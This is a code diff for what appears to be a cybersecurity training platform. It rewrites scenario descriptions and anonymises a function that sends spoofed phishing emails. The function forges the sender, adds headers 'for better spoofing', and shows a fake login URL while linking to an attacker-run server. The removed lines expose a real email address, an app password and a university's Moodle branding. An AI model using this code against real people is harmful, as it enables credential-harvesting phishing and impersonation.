@@ -403,17 +403,17 @@ target_env = TargetEnvironment()
 AVAILABLE_SCENARIOS = {
     'phishing_analysis': {
         'name': 'Phishing Awareness Simulator',
-        'description': 'Educational platform for understanding phishing tactics',
+        'description': 'Educational platform for understanding phishing tactics. Participants analyze real-world phishing attempts, learn to identify suspicious emails, and track success rates through log analysis. Includes common social engineering techniques and prevention methods.',
         'tools': ['Open OS'],
         'difficulty': 'Beginner',
-        'commands_order': ['View the phishing cred'],  # Add order list
+        'commands_order': ['View the phishing cred'],  
         'commands': {
             'View the phishing cred': 'cat /home/logs/phishing_success.log',
         }
     },
     'sql_injection': {
         'name': 'SQL Injection Training',
-        'description': 'Learn about SQL injection vulnerabilities through a simulated company database',
+        'description': 'Hands-on training environment for SQL injection techniques using a vulnerable test database. Practice identifying injection points, understanding common attack patterns, and learning proper defense mechanisms through a simulated company database scenario.',
         'tools': ['MySQL Client', 'Basic SQL commands'],
         'difficulty': 'Beginner',
         'commands_order': [  
@@ -429,7 +429,7 @@ AVAILABLE_SCENARIOS = {
     },
     'ransomware_analysis': {
         'name': 'Ransomware Impact Simulator',
-        'description': 'Understand ransomware attacks and data protection through a safe simulation',
+        'description': 'Safe simulation environment demonstrating ransomware attack impacts. Learn proper backup procedures, encryption/decryption processes, and incident response steps. Includes a mock ransom scenario with guided recovery procedures and best practices for prevention.',
         'tools': ['MySQL Client', 'Basic Linux commands'],
         'difficulty': 'Advanced',
         'commands_order': [  
@@ -457,10 +457,10 @@ AVAILABLE_SCENARIOS = {
     },
     'data_breach': {
         'name': 'Data Breach Prevention',
-        'description': 'Learn to identify and prevent common data breach scenarios',
+        'description': 'Practical training on identifying and preventing data breaches. Covers port scanning, database user privilege analysis, and sensitive data detection. Participants learn to spot common security misconfigurations and implement proper access controls through hands-on exercises.',
         'tools': ['MySQL Client', 'Network tools'],
         'difficulty': 'Beginner',
-        'commands_order': [  # Add order list
+        'commands_order': [  
             'Scan ports',
             'Check MySQL users',
             'View sensitive data'
@@ -815,17 +815,17 @@ def send_bait_email():
         port = container.assigned_port
 
         # Use the specified IP address with dynamic port
-        ip_address = "89.168.41.6"
+        ip_address = "https://Your-IP-Address.com"
 
         # Email configuration
         smtp_server = "smtp.gmail.com"
         smtp_port = 587
-        real_email = "xxalexube@gmail.com"
-        app_password = "wwbz yvkd arht ytcs"
+        real_email = "email@gmail.com" # Your email 
+        app_password = "APP-PASSWORD" # Your app password
 
         # Spoofed sender information
-        spoofed_email = "admin@moodle2024.pcz.pl"
-        display_name = "Moodle Administration"
+        spoofed_email = "admin@system.com"
+        display_name = "System Administration"
 
         # Create HTML content with dynamic port
         html_body = f"""
@@ -836,7 +836,7 @@ def send_bait_email():
 
         <p>Dear User,</p>
 
-        <p>Thank you for using our Moodle system. To ensure the security and smooth functioning of your account, we require immediate verification.</p>
+        <p>Thank you for using our system. To ensure the security and smooth functioning of your account, we require immediate verification.</p>
 
         <p style="font-size: 16px;">Please click the link below to log in and verify your account:</p>
 
@@ -852,15 +852,15 @@ def send_bait_email():
         <p style="margin-top: 20px;">Thank you for your prompt action.</p>
 
         <p style="color: #555;">Best regards,<br>
-        Moodle Administration Team</p>
+        System Administration Team</p>
 
         <div style="margin-top: 30px; text-align: center;">
-            <img src="https://cdn-public.softwarereviews.com/production/logos/offerings/59/large/2560px-Moodle-logo.svg.png" 
-                 alt="Moodle Logo" 
+            <img src="https://i.postimg.cc/3xMNybP4/6499633-ai.png" 
+                 alt="Logo" 
                  style="width: 250px; margin: 10px;" 
                  class="logo"/>
-            <img src="https://logowanie.man.pcz.pl/idp/images/logo_pcz_text.png" 
-                 alt="Politechnika Częstochowska" 
+            <img src="https://logos-world.net/wp-content/uploads/2023/05/Anonymous-Emblem.png" 
+                 alt="Logo" 
                  style="width: 250px; margin: 10px;" 
                  class="logo"/>
         </div>
@@ -873,7 +873,7 @@ def send_bait_email():
         message = MIMEMultipart('alternative')
         message["From"] = formataddr((display_name, spoofed_email))
         message["To"] = target_email
-        message["Subject"] = "Moodle: Account Verification Required"
+        message["Subject"] = "System: Account Verification Required"
         message.attach(MIMEText(html_body, 'html'))
 
         # Add custom headers for better spoofing
@@ -894,7 +894,7 @@ def send_bait_email():
                 email_data = {
                     'target_email': target_email,
                     'real_url': f"http://{ip_address}:{port}",
-                    'display_url': 'https://moodle2024.pcz.pl/login',
+                    'display_url': 'https://Domain-Name.com', # Put the domain name you want to clone
                     'spoofed_sender': spoofed_email,
                     'timestamp': time.time(),
                     'status': 'sent',
